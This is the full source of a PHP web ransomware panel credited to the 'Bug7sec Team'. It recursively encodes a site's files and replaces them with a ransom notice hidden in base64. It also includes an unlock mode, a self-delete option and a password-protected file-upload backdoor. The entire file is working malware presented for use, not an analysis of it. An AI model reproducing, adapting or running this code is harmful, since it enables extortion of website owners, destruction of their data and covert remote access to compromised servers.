<?php
error_reporting(0);
set_time_limit(0);
ini_set('memory_limit', '-1');
/**
* BUG7SEC TEAM - SHOR7CUT | shc Ransomware (Web)
* 13/05/2016
*/
class bug7sec
{
    public function generate_enc($leak){
        for ($i=1; $i <3; $i++) { 
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            $leak = base64_encode(str_rot13($leak));
            $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
        }
            $pesan  = base64_decode("VGhpcyBzaXRlIGhhcyBiZWVuIGxvY2tlZCAoPiwgPCkgd2VlZWtrIC4uLiwgcGxlYXNlIGNvbnRhY3QgdG8gZW1haWwgc2hvcjdjdXRAbG9jYWxob3N0IHRvIHVubG9jayB0aGlzIHNpdGUgYmFjay4=");
            $leak   = "<!--#LOCK#".$leak."--> <title>(>,<) Site has been Locked</title> <em>".$pesan."</em>";
        return $leak;
    }
    public function generate_dec($leak){
        $woh = "/<!--#LOCK#(.*?)-->/";
        preg_match($woh, $leak, $matches);
        if($matches[1]){
            $leak = $matches[1];
            for ($i=1; $i <3; $i++) {
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
                $leak = str_rot13(base64_decode($leak));
                $leak = substr($leak,(strlen($leak)/2)) . substr($leak,0,(strlen($leak)/2));
            }
        }else{
            return false;
        }
            return $leak;
    }
    public function lock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = bug7sec::generate_enc($fgt);
        if(bug7sec::w00t($lock,$location_file)){
            echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Locked Done!!!</font><br>";
        }else{
            echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='red'>Locked Fail!!!</font><br>";
        }
    }
    public function unlock($location_file){
        $fgt    = file_get_contents($location_file); 
        $lock   = bug7sec::generate_dec($fgt);
        if(bug7sec::w00t($lock,$location_file)){
             echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Done!!!</font><br>";
        }else{
             echo "root@shor7cut:~ <font color='white'>{$location_file}</font> <font color='#FF03F5'>Unlocked Fail!!!</font><br>";
        }
     }

     public function w00t($data,$locate){
        if( file_put_contents($locate, htmlentities($data) ) ){
               return true;
            }else{
               return false;
        }
     }

     public function cuk($ext,$name){
        $re = "/({$name})/";  
        preg_match($re, $ext, $matches);
        if($matches[1]){
            return false;
        }
            return true;
     }

    public function boom($dir,$mode)
    {
        foreach(scandir($dir) as $d)
        {
            if($d!='.' && $d!='..')
            {
                $d = $dir.DIRECTORY_SEPARATOR.$d;
                if(!is_dir($d)){
                    if(bug7sec::cuk($d,".png") && bug7sec::cuk($d,".svg") && bug7sec::cuk($d,".woff") && bug7sec::cuk($d,".jpg") && bug7sec::cuk($d,".htaccess") && bug7sec::cuk($d,"lol.php")  ){
                    
                    if($mode == "1"){
                        $locaked = bug7sec::lock($d);
                    }else{
                        $unlock = bug7sec::unlock($d);
                    }

                    }
                }else{
                    bug7sec::boom($d,$mode);
                }
            }
        flush();
        ob_flush();
        }
    }
    public function locate(){
        return getcwd();
    }
    public function savemode(){
        $remove = unlink(basename($_SERVER['PHP_SELF']));
        if($remove){
            return true;
        }else{
            return false;
        }
    }

}
?>

<!DOCTYPE html>
<html>
<head>
    <title>SyNcryption | Bug7sec Team</title>
<style type="text/css">
    body{
            color: #3EF403;
            background-color: black;
    }
    input {
            border: dashed 1px;
            border-color: #333;
            background-color: Black;
            font: 8pt Verdana;
            color: #0CFF37;
    }
 
    select {
        border: dashed 1px;
        border-color: #333;
        background-color: Black;
        font: 8pt Verdana;
        color: #0CFF37;
    }
        </style>
</head>
<body>
<pre style="text-align: center"><font color="red">
  _________.__                _________               __   
 /   _____/|  |__   __________\______  \ ____  __ ___/  |_ 
 \_____  \ |  |  \ /  _ \_  __ \  /    // ___\|  |  \   __\</font><font color="white">
 /        \|   Y  (  <_> )  | \/ /    /\  \___|  |  /|  | 
/_______  /|___|  /\____/|__|   /____/  \___  >____/ |__|  
        \/      \/                          \/  </font><font color="red">MERAH</font> <FONT color="white">PUTIH</FONT>
    
</pre>
 
<Center>
<?php 
if($_GET['pwd']=="shor7cut"){
echo '
<form method=POST enctype="multipart/form-data" action="">
<input type="file" name="files" class="upload"> <input type=submit value="Upload"></form>';
    $files = @$_FILES["files"];
    if ($files["name"] != '') {
        $fullpath = $files["name"];
        if (move_uploaded_file($files['tmp_name'], $fullpath)) {
            echo '<font color="green">Berhasil Cuk!!!</font>';
        }else{
            echo '<font color="red">Gagal Cuk!!!</font>';
        }
    }
}else{?>
<form action="" method="post">
<input type="text" name="url" placeholder="<?= bug7sec::locate(); ?>" value="<?= bug7sec::locate(); ?>">
<select name="method">
        <option value="1">Locked</option>
        <option value="2">Unlocked</option>
</select>
<input type="checkbox" name="savemode" value="1">Save Mode
<input type="submit" name="submit" value="Boom!"/>
</form>
<pre style="text-align: left;"><?php
 if(isset($_POST['submit'])){
    echo bug7sec::boom($_POST['url'],$_POST['method']);
    if($_POST['savemode']=="1"){
        if(bug7sec::savemode()){
        echo "(>,<) #Lariii.....";
        }
    }
}
?>
<?php
}
?>
</pre>
</Center>
</body>
</html>
